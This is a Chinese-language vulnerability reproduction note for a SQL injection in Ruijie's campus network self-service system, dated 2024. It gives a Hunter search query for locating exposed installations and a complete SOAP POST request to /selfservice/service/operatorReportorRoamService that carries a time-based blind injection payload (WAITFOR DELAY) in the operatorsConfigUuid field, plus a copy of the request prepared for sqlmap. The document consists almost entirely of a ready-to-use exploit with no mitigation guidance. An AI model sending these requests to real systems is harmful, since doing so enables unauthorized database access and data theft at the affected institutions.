# 锐捷网络股份有限公司校园网自助服务系统queryAccountNumReportDataDetail存在SQL注入漏洞

# 一、漏洞简介
锐捷网络股份有限公司校园网自助服务系统queryAccountNumReportDataDetail存在SQL注入漏洞。

# 二、影响版本
+ 锐捷网络股份有限公司校园网自助服务系统

# 三、资产测绘
+ hunter`app="校园网自助服务系统"`
+ 特征

![1698596756667-deb61ce2-460f-4df0-bfb5-037838f17027.png](./img/VkEN-dwHXTrP9O5n/1698596756667-deb61ce2-460f-4df0-bfb5-037838f17027-798744.png)

# 四、漏洞复现
```plain
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=42E7A33A54CABB1580E34F01B3D63480; JSESSIONID=0616C2E6B689FD5702EE3E2203D660FB
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 873

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com" xmlns:dom="http://domain.service.webservice.common.spl.ruijie.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:queryAccountNumReportDataDetail>
         <ser:in0>
            <!--type: dateTime-->
            <dom:endTime>2008-09-29T09:49:45</dom:endTime>
            <!--type: int-->
            <dom:limit>3</dom:limit>
            <!--type: int-->
            <dom:offSet>3</dom:offSet>
            <!--type: string-->
            <dom:operatorsConfigUuid>aeoliam venit';WAITFOR DELAY '0:0:5'--</dom:operatorsConfigUuid>
            <!--type: dateTime-->
            <dom:startTime>2014-06-09T23:15:04+08:00</dom:startTime>
         </ser:in0>
      </ser:queryAccountNumReportDataDetail>
   </soapenv:Body>
</soapenv:Envelope>
```

![1713339788088-ab68d76f-65e0-4f00-beae-f05e2e7d6fad.png](./img/VkEN-dwHXTrP9O5n/1713339788088-ab68d76f-65e0-4f00-beae-f05e2e7d6fad-278254.png)

sqlmap

```plain
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=42E7A33A54CABB1580E34F01B3D63480; JSESSIONID=0616C2E6B689FD5702EE3E2203D660FB
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 873

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com" xmlns:dom="http://domain.service.webservice.common.spl.ruijie.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:queryAccountNumReportDataDetail>
         <ser:in0>
            <!--type: dateTime-->
            <dom:endTime>2008-09-29T09:49:45</dom:endTime>
            <!--type: int-->
            <dom:limit>3</dom:limit>
            <!--type: int-->
            <dom:offSet>3</dom:offSet>
            <!--type: string-->
            <dom:operatorsConfigUuid>aeoliam venit</dom:operatorsConfigUuid>
            <!--type: dateTime-->
            <dom:startTime>2014-06-09T23:15:04+08:00</dom:startTime>
         </ser:in0>
      </ser:queryAccountNumReportDataDetail>
   </soapenv:Body>
</soapenv:Envelope>
```

![1713339819071-b490ef2d-3d5c-4618-9666-2b16a9bd8972.png](./img/VkEN-dwHXTrP9O5n/1713339819071-b490ef2d-3d5c-4618-9666-2b16a9bd8972-518241.png)



> 更新: 2024-06-24 11:42:27  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xtp0qz0at8exgx9o>